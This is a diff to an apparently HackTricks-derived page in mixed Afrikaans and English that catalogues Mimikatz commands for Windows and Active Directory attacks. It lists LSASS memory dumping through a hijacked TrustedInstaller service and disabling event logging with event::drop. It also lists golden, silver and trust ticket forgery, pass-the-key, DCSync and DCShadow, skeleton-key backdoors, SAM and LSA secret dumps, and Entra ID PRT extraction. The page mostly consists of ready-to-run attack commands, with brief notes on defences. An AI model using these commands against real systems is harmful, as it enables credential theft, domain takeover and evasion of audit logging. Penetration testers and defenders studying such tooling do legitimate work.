@@ -5,198 +5,227 @@
 
 **Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Kyk na die oorspronklike vir verdere inligting!
 
-## LM en Duidelike Teks in geheue
+## LM and Clear-Text in memory
 
-Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen diefstal van geloofsbriewe te beskerm:
+Vanaf Windows 8.1 en Windows Server 2012 R2 word beduidende maatreëls geïmplementeer om teen credential theft te beskerm:
 
-- **LM hashes en duidelike teks wagwoorde** word nie meer in geheue gestoor om sekuriteit te verbeter nie. 'n Spesifieke registrasie instelling, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet geconfigureer word met 'n DWORD waarde van `0` om Digest Authentication te deaktiveer, wat verseker dat "duidelike teks" wagwoorde nie in LSASS gegee word nie.
+- **LM hashes and plain-text passwords** word nie meer in memory gestoor nie om security te verbeter. ’n Spesifieke registry setting, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ moet met ’n DWORD value van `0` gekonfigureer word om Digest Authentication te deaktiveer, wat verseker dat "clear-text" passwords nie in LSASS gestaaf word nie.
 
-- **LSA Beskerming** word bekendgestel om die Plaaslike Sekuriteitsowerheid (LSA) proses te beskerm teen ongeoorloofde geheue lees en kode inspuiting. Dit word bereik deur die LSASS as 'n beskermde proses te merk. Aktivering van LSA Beskerming behels:
-1. Die registrasie te wysig by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
-2. 'n Groep Beleidsobjek (GPO) te implementeer wat hierdie registrasie verandering oor bestuurde toestelle afdwing.
+- **LSA Protection** word ingestel om die Local Security Authority (LSA) process te beskerm teen ongemagtigde memory reading en code injection. Dit word bereik deur die LSASS as ’n protected process te merk. Aktivering van LSA Protection behels:
+1. Wysig die registry by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
+2. Implementeer ’n Group Policy Object (GPO) wat hierdie registry change oor bestuurde devices afdwing.
 
-Ten spyte van hierdie beskermings, kan gereedskap soos Mimikatz LSA Beskerming omseil deur spesifieke bestuurders te gebruik, alhoewel sulke aksies waarskynlik in gebeurtenislogs aangeteken sal word.
+Ten spyte van hierdie protections, kan tools soos Mimikatz LSA Protection omseil deur spesifieke drivers te gebruik, hoewel sulke actions waarskynlik in event logs aangeteken sal word.
 
-### Teenwerking van SeDebugPrivilege Verwydering
+Op moderne workstations maak dit selfs meer saak omdat **Credential Guard by default op baie Windows 11 22H2+ en Windows Server 2025 domain-joined, non-DC systems geaktiveer is**, terwyl **LSASS-as-PPL by default op vars Windows 11 22H2+ installs geaktiveer is**. In die praktyk beteken dit dat `sekurlsa::logonpasswords` dikwels minder materiaal oplewer as wat ouer tradecraft verwag het en operators al hoe meer oorskakel na **offline minidumps**, **Kerberos key extraction (`sekurlsa::ekeys`)**, of **CloudAP/PRT-georiënteerde modules**. Vir die protection-kant, kyk by [Windows credentials protections](credentials-protections.md).
 
-Administrateurs het tipies SeDebugPrivilege, wat hulle in staat stel om programme te debugeer. Hierdie voorreg kan beperk word om ongeoorloofde geheue dumps te voorkom, 'n algemene tegniek wat deur aanvallers gebruik word om geloofsbriewe uit geheue te onttrek. Maar, selfs met hierdie voorreg verwyder, kan die TrustedInstaller rekening steeds geheue dumps uitvoer deur 'n aangepaste dienskonfigurasie:
+### Counteracting SeDebugPrivilege Removal
+
+Administrators het tipies SeDebugPrivilege, wat hulle in staat stel om programs te debug. Hierdie privilege kan beperk word om ongemagtigde memory dumps te voorkom, ’n algemene technique wat deur attackers gebruik word om credentials uit memory te onttrek. Selfs met hierdie privilege verwyder, kan die TrustedInstaller account egter steeds memory dumps uitvoer deur ’n aangepaste service configuration te gebruik:
 ```bash
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-Dit stel die dumping van die `lsass.exe` geheue na 'n lêer in, wat dan op 'n ander stelsel geanaliseer kan word om kredensiale te onttrek:
+Dit laat toe om die `lsass.exe`-geheue na ’n lêer te dump, wat dan op ’n ander stelsel geanaliseer kan word om credentials te onttrek:
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
 # sekurlsa::logonpasswords
 ```
-## Mimikatz Opsies
+## Mimikatz Options
 
-Event log manipulasie in Mimikatz behels twee primêre aksies: die skoonmaak van gebeurtenislogs en die patching van die Event-diens om die registrasie van nuwe gebeurtenisse te voorkom. Hieronder is die opdragte om hierdie aksies uit te voer:
+Event log tampering in Mimikatz behels twee primêre aksies: die skoonmaak van event logs en die patching van die Event service om logging van nuwe events te voorkom. Hieronder is die commands vir die uitvoering van hierdie aksies:
 
-#### Skoonmaak van Gebeurtenislogs
+#### Clearing Event Logs
 
-- **Opdrag**: Hierdie aksie is daarop gemik om die gebeurtenislogs te verwyder, wat dit moeiliker maak om kwaadwillige aktiwiteite te volg.
-- Mimikatz bied nie 'n direkte opdrag in sy standaard dokumentasie vir die skoonmaak van gebeurtenislogs direk via sy opdraglyn nie. Dit behels egter tipies die gebruik van stelsels gereedskap of skripte buite Mimikatz om spesifieke logs skoon te maak (bv. met PowerShell of Windows Event Viewer).
+- **Command**: Hierdie aksie is gemik op die uitvee van die event logs, wat dit moeiliker maak om kwaadwillige aktiwiteite op te spoor.
+- Mimikatz bied nie ’n direkte command in sy standaard dokumentasie vir die skoonmaak van event logs direk via sy command line nie. Event log manipulation behels egter tipies die gebruik van system tools of scripts buite Mimikatz om spesifieke logs skoon te maak (bv. deur PowerShell of Windows Event Viewer te gebruik).
 
-#### Eksperimentele Kenmerk: Patching van die Event-diens
+#### Experimental Feature: Patching the Event Service
 
-- **Opdrag**: `event::drop`
-- Hierdie eksperimentele opdrag is ontwerp om die gedrag van die Event Logging Service te wysig, wat effektief voorkom dat dit nuwe gebeurtenisse registreer.
-- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`
+- **Command**: `event::drop`
+- Hierdie eksperimentele command is ontwerp om die Event Logging Service se gedrag te wysig, en voorkom effektief dat dit nuwe events opteken.
+- Example: `mimikatz "privilege::debug" "event::drop" exit`
 
-- Die `privilege::debug` opdrag verseker dat Mimikatz met die nodige voorregte werk om stelseldienste te wysig.
-- Die `event::drop` opdrag patch dan die Event Logging diens.
+- Die `privilege::debug` command verseker dat Mimikatz met die nodige privileges werk om system services te wysig.
+- Die `event::drop` command patch dan die Event Logging service.
 
-### Kerberos Tekenaanvalle
+### Kerberos Ticket Attacks
 
-### Goue Teken Skepping
+Gebruik die commands hieronder as vinnige syntax-herinneringe. Die toegewyde bladsye vir [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md), en [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) bevat die bygewerkte AES/PAC/opsec nuanses.
 
-'n Goue Teken stel in staat tot domein-wye toegang impersonasie. Sleutelopdrag en parameters:
+### Golden Ticket Creation
 
-- Opdrag: `kerberos::golden`
+A Golden Ticket laat domain-wide access impersonation toe. Sleutel command en parameters:
+
+- Command: `kerberos::golden`
 - Parameters:
-- `/domain`: Die domeinnaam.
-- `/sid`: Die domein se Veiligheidsidentifiseerder (SID).
-- `/user`: Die gebruikersnaam om te impersonate.
-- `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
-- `/ptt`: Spesifiek die teken direk in geheue inspuit.
-- `/ticket`: Stoor die teken vir later gebruik.
+- `/domain`: Die domain name.
+- `/sid`: Die domain se Security Identifier (SID).
+- `/user`: Die username om te impersonate.
+- `/krbtgt`: Die NTLM hash van die domain se KDC service account.
+- `/ptt`: Inject die ticket direk in memory.
+- `/ticket`: Stoor die ticket vir later gebruik.
 
-Voorbeeld:
+Example:
 ```bash
 mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
 ```
-### Silver Ticket Skepping
+### Silver Ticket Creation
 
-Silver Tickets gee toegang tot spesifieke dienste. Sleutelopdrag en parameters:
+Silver Tickets verleen toegang tot spesifieke dienste. Sleutelopdrag en parameters:
 
-- Opdrag: Soortgelyk aan Golden Ticket maar teiken spesifieke dienste.
+- Command: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
 - Parameters:
-- `/service`: Die diens om te teiken (bv., cifs, http).
+- `/service`: Die diens om te teiken (bv. cifs, http).
 - Ander parameters soortgelyk aan Golden Ticket.
 
 Voorbeeld:
 ```bash
 mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
 ```
-### Vertroue Teken Skep
+### Trust Ticket Creation
 
-Vertroue Teken word gebruik om toegang tot hulpbronne oor domeine te verkry deur vertrouensverhoudings te benut. Sleutelopdrag en parameters:
+Trust Tickets word gebruik vir toegang tot hulpbronne oor domeine heen deur trust-verhoudings te benut. Belangrike opdrag en parameters:
 
-- Opdrag: Soortgelyk aan Goue Teken, maar vir vertrouensverhoudings.
+- Command: Soortgelyk aan Golden Ticket maar vir trust-verhoudings.
 - Parameters:
-- `/target`: Die FQDN van die teikendomein.
-- `/rc4`: Die NTLM-hash vir die vertrouensrekening.
+- `/target`: Die teikendom se FQDN.
+- `/rc4`: Die NTLM-hash vir die trust-rekening.
 
 Voorbeeld:
 ```bash
 mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
 ```
-### Bykomende Kerberos Opdragte
+### Addisionele Kerberos-opdragte
 
-- **Lys Kaartjies**:
+- **Listing Tickets**:
 
-- Opdrag: `kerberos::list`
-- Lys alle Kerberos kaartjies vir die huidige gebruikersessie.
+- Command: `kerberos::list`
+- Lys alle Kerberos-tickets vir die huidige gebruikersessie.
 
-- **Gee die Kas**:
+- **Pass the Cache**:
 
-- Opdrag: `kerberos::ptc`
-- Spuit Kerberos kaartjies uit kaslêers in.
-- Voorbeeld: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
+- Command: `kerberos::ptc`
+- Inspuit Kerberos-tickets vanaf kaslêers.
+- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`
 
-- **Gee die Kaartjie**:
+- **Pass the Ticket**:
 
-- Opdrag: `kerberos::ptt`
-- Laat toe om 'n Kerberos kaartjie in 'n ander sessie te gebruik.
-- Voorbeeld: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
+- Command: `kerberos::ptt`
+- Laat toe om 'n Kerberos-ticket in 'n ander sessie te gebruik.
+- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`
 
-- **Verwyder Kaartjies**:
-- Opdrag: `kerberos::purge`
-- Maak alle Kerberos kaartjies uit die sessie skoon.
-- Nuttig voor die gebruik van kaartjie manipulasie opdragte om konflikte te vermy.
+- **Purge Tickets**:
+- Command: `kerberos::purge`
+- Maak alle Kerberos-tickets uit die sessie skoon.
+- Nuttig voordat jy ticket manipulation-opdragte gebruik om konflik te vermy.
 
-### Aktiewe Gids Manipulasie
+### Over-Pass-the-Hash / Pass-the-Key
 
-- **DCShadow**: Tydelik 'n masjien laat optree as 'n DC vir AD objek manipulasie.
+As `RC4` gedeaktiveer is of onbetroubaar is, kan Mimikatz **AES128/AES256 Kerberos keys** in die huidige logon session patch in plaas van net 'n NT hash gebruik. Dit is gewoonlik 'n beter pasmaat vir moderne domains as om `sekurlsa::pth` as net NTLM-only te behandel.
+```bash
+mimikatz "privilege::debug" "sekurlsa::ekeys" exit
+mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
+mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
+```
+`/impersonate` hergebruik die huidige proses in plaas daarvan om ’n nuwe konsole te spawn, wat handig is wanneer jy onmiddellik dinge soos `lsadump::dcsync` in dieselfde konteks wil run.
+
+### Active Directory Tampering
+
+- **DCShadow**: Maak tydelik ’n machine as ’n DC optree vir AD object manipulation. Sien [DCShadow](../active-directory-methodology/dcshadow.md).
 
 - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`
 
-- **DCSync**: Naboots 'n DC om wagwoorddata aan te vra.
+- **DCSync**: Mimic ’n DC om password data aan te vra. Sien [DCSync](../active-directory-methodology/dcsync.md).
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### Krediettoegang
+### Credential Access
 
-- **LSADUMP::LSA**: Trek krediete uit LSA.
+- **LSADUMP::LSA**: Extract credentials from LSA.
 
 - `mimikatz "lsadump::lsa /inject" exit`
 
-- **LSADUMP::NetSync**: Naboots 'n DC met 'n rekenaarrekening se wagwoorddata.
+- **LSADUMP::NetSync**: Impersonate ’n DC using a computer account's password data.
 
-- _Geen spesifieke opdrag verskaf vir NetSync in oorspronklike konteks._
+- _Geen spesifieke command vir NetSync in die oorspronklike konteks verskaf nie._
 
-- **LSADUMP::SAM**: Toegang tot plaaslike SAM databasis.
+- **LSADUMP::SAM**: Access local SAM database.
 
 - `mimikatz "lsadump::sam" exit`
 
-- **LSADUMP::Secrets**: Dekripsie van geheime wat in die register gestoor is.
+- **LSADUMP::Secrets**: Decrypt secrets gestoor in die registry.
 
 - `mimikatz "lsadump::secrets" exit`
 
-- **LSADUMP::SetNTLM**: Stel 'n nuwe NTLM-hash vir 'n gebruiker in.
+- **LSADUMP::SetNTLM**: Stel ’n nuwe NTLM hash vir ’n user.
 
 - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`
 
-- **LSADUMP::Trust**: Verkry vertrouensverifikasie-inligting.
+- **LSADUMP::Trust**: Retrieve trust authentication information.
 - `mimikatz "lsadump::trust" exit`
 
-### Divers
+### Cloud credentials / Entra ID
 
-- **MISC::Skeleton**: Spuit 'n agterdeur in LSASS op 'n DC.
+Op **Entra ID** of **hybrid-joined** hosts kan `sekurlsa::cloudap` cached **Primary Refresh Token (PRT)** materiaal uit LSASS expose. As die geassosieerde Proof-of-Possession key software-protected is, kan `dpapi::cloudapkd` die clear/derived key materiaal aflei wat nodig is vir opvolgende **Pass-the-PRT** workflows.
+```bash
+mimikatz "privilege::debug" "sekurlsa::cloudap" exit
+mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
+mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
+```
+Dit word baie moeiliker wanneer die sleutel TPM-backed is, maar dit is die moeite werd om op hybrid endpoints te kyk omdat die gekaste CloudAP-data moontlik interessanter kan wees as klassieke `wdigest`-uitvoer. Vir die cloud-side abuse-ketting, sien [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).
+
+### Miscellaneous
+
+- **MISC::Skeleton**: Inject a backdoor in LSASS op ’n DC.
 - `mimikatz "privilege::debug" "misc::skeleton" exit`
 
 ### Privilege Escalation
 
-- **PRIVILEGE::Backup**: Verkry rugsteunregte.
+- **PRIVILEGE::Backup**: Verkry backup-regte.
 
 - `mimikatz "privilege::backup" exit`
 
-- **PRIVILEGE::Debug**: Verkry debug regte.
+- **PRIVILEGE::Debug**: Verkry debug-privileges.
 - `mimikatz "privilege::debug" exit`
 
-### Kredietdumping
+### Credential Dumping
 
-- **SEKURLSA::LogonPasswords**: Toon krediete vir ingelogde gebruikers.
+- **SEKURLSA::LogonPasswords**: Wys credentials vir aangemelde users.
 
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
-- **SEKURLSA::Tickets**: Trek Kerberos kaartjies uit geheue.
+- **SEKURLSA::Tickets**: Extraheer Kerberos-tickets uit memory.
 - `mimikatz "sekurlsa::tickets /export" exit`
 
-### Sid en Token Manipulasie
+### Sid and Token Manipulation
 
 - **SID::add/modify**: Verander SID en SIDHistory.
 
-- Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
-- Verander: _Geen spesifieke opdrag vir verander in oorspronklike konteks._
+- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
+- Modify: _Geen spesifieke command vir modify in die oorspronklike konteks nie._
 
-- **TOKEN::Elevate**: Naboots tokens.
+- **TOKEN::Elevate**: Improviseer tokens.
 - `mimikatz "token::elevate /domainadmin" exit`
 
-### Terminal Dienste
+### Terminal Services
 
-- **TS::MultiRDP**: Laat meerdere RDP sessies toe.
+- **TS::MultiRDP**: Laat multiple RDP-sessies toe.
 
 - `mimikatz "ts::multirdp" exit`
 
-- **TS::Sessions**: Lys TS/RDP sessies.
-- _Geen spesifieke opdrag verskaf vir TS::Sessions in oorspronklike konteks._
+- **TS::Sessions**: Lys TS/RDP-sessies.
+- _Geen spesifieke command verskaf vir TS::Sessions in die oorspronklike konteks nie._
 
-### Kluis
+### Vault
 
-- Trek wagwoorde uit Windows Kluis.
+- Extraheer passwords uit Windows Vault.
 - `mimikatz "vault::cred /patch" exit`
 
+
+## References
+
+- [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
+- [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
 
 {{#include ../../banners/hacktricks-training.md}}
